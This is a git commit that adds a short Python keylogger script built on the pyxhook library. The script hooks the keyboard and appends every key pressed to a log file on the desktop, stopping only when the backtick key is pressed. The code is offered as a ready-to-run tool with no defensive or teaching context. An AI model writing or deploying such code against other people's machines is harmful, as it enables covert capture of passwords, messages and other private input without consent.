b9c05e226e2f4c37f04600ac5815a8cfb6153dd0
Anonymous <44407174+AubreytheHacker18@users.noreply.github.com>
2019-01-30 05:57:17 +0200

    Kelogger.py

---
+++ keylogger.py
@@ -0,0 +1,22 @@
+import pyxhook
+
+#change this to your log file's path
+log_file='/home/anonymas/Desktop/file.log'
+
+#this function is called everytime a key is pressed.
+def OnKeyPress(event):
+  fob=open(log_file,'a')
+  fob.write(event.Key)
+  fob.write('\n')
+
+  if event.Ascii==96: 
+    fob.close()
+    new_hook.cancel()
+#instantiate HookManager class
+new_hook=pyxhook.HookManager()
+#listen to all keystrokes
+new_hook.KeyDown=OnKeyPress
+#hook the keyboard
+new_hook.HookKeyboard()
+#start the session
+new_hook.start()
